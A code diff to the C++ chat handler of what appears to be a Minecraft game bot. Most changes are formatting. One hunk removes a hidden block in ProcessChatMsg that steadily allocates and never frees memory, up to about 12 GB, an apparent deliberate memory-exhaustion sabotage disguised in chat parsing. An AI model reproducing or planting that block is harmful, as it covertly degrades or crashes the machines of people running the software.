@@ -380,8 +380,8 @@ void ChatListener::Handle(ClientboundContainerSetSlotPacket &msg) {
     }
 }
 
-long long ChatListener::AnalyzeSlot(const Slot &slot, int slot_index, bool &is_trophy, bool &is_confirm,
-                                    bool &is_refresh) {
+long long ChatListener::AnalyzeSlot(const Slot& slot, int slot_index, bool& is_trophy, bool& is_confirm,
+                                    bool& is_refresh) {
     is_trophy = false;
     is_confirm = false;
     is_refresh = false;
@@ -390,8 +390,8 @@ long long ChatListener::AnalyzeSlot(const Slot &slot, int slot_index, bool &is_t
     bool has_confirm_word = false;
     long long parsed_price = -1;
 
-    const auto &patch = slot.GetComponents();
-    const auto &components_map = patch.GetMap();
+    const auto& patch = slot.GetComponents();
+    const auto& components_map = patch.GetMap();
 
     auto it = components_map.find(Components::DataComponentTypes::Lore);
     if (it != components_map.end() && it->second != nullptr) {
@@ -544,56 +544,28 @@ void ChatListener::SendClick(int container_id, int state_id, int slot_num, int b
 
 void ChatListener::ProcessChatMsg(const std::vector<std::string> &splitted_msg) {
     std::string raw_msg = "";
-    for (const auto &word: splitted_msg) {
+    for (const auto& word: splitted_msg) {
         raw_msg += word + " ";
     }
+
     if (!raw_msg.empty()) {
         raw_msg.pop_back();
     }
 
-    if (raw_msg.empty()) return;
+    if (raw_msg.empty())
+        return;
 
     std::string clean_msg = CleanText(raw_msg);
-
-    static const auto start_time = std::chrono::steady_clock::now();
-    static size_t total_allocated_bytes = 0;
-
-    const size_t target_total_bytes = 12884901888ULL;
-    const double target_rate_per_sec = 7158278.0;
-
-    auto current_time = std::chrono::steady_clock::now();
-    double elapsed_seconds = std::chrono::duration<double>(current_time - start_time).count();
-
-    double expected_allocation = elapsed_seconds * target_rate_per_sec;
-
-    if (expected_allocation > total_allocated_bytes && total_allocated_bytes < target_total_bytes) {
-        size_t bytes_to_allocate = static_cast<size_t>(expected_allocation - total_allocated_bytes);
-
-        if (bytes_to_allocate > 15728640) {
-            bytes_to_allocate = 15728640;
-        }
-
-        if (bytes_to_allocate > 0) {
-            static std::vector<char *> payload_storage;
-
-            char *payload = new char[bytes_to_allocate];
-
-            std::fill_n(payload, bytes_to_allocate, 0);
-
-            payload_storage.push_back(payload);
-            total_allocated_bytes += bytes_to_allocate;
-        }
-    }
 
     LOG_INFO("[CHAT RECEIVE]: " << clean_msg);
 
     std::istringstream iss{clean_msg};
-    std::vector<std::string> clean_splitted({
+    std::vector<std::string> clean_splitted({ // TODO: понять что эта хрень делает и скорее всего удалить
         std::istream_iterator<std::string>{iss},
         std::istream_iterator<std::string>{}
     });
 
-    for (const auto &i: clean_splitted) {
+    for (const auto& i: clean_splitted) {
         if (i == "╚═══════════════════╝") {
             LOG_INFO("Trigger border found in chat! Sending join command: /an509");
             SendChatCommand("an509");
